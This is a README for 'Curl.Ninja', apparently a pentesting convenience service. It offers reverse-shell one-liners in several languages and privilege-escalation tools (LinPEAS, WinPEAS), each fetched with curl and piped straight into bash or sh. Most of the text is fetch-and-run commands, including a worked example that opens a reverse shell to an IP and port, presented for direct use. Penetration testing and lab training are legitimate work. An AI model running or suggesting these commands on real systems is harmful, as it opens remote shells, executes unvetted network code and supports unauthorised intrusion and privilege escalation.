# Curl.Ninja
Shellcode and tools always a `curl` away.

## Shellcode 🐚
Generate and run shellcode one-liners:
```shell
curl https://curl.ninja/shell/LANGUAGE/IP/PORT | bash
```

### Example
```shell
curl https://curl.ninja/shell/bash/10.10.10.1/6969 | bash
```

### Language Support
Thanks to [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for the language support:
 - [x] **Bash** via `/bash/`
 - [x] **Java** via `/java/`
 - [x] **Netcat** via `/nc/`
 - [x] **PERL** via `/perl/`
 - [x] **PHP** via `/php/`
 - [x] **Python** via `/python/`
 - [x] **Ruby** via `/ruby/`

## Tools 🛠
Easily download tools from GitHub:
```shell
curl https://curl.ninja/TOOLNAME | sh | sh
curl https://curl.ninja/TOOLNAME | sh > FILENAME
```

### Examples
```shell
curl https://curl.ninja/linpeas | sh | sh
curl https://curl.ninja/winpeas | sh > wp.exe
```

### Available Tools
 - [x] [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) via `/linpeas`
 - [x] [WinPEASx84.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) via `/winpeas`
 - [x] WinPEASx64.exe via `winpeas64`

 If you notice any of your favorite open source tools are missing or your CLI tool of choice is returing `html`, open an [issue](https://github.com/Hack-Church/curl-ninja/issues)
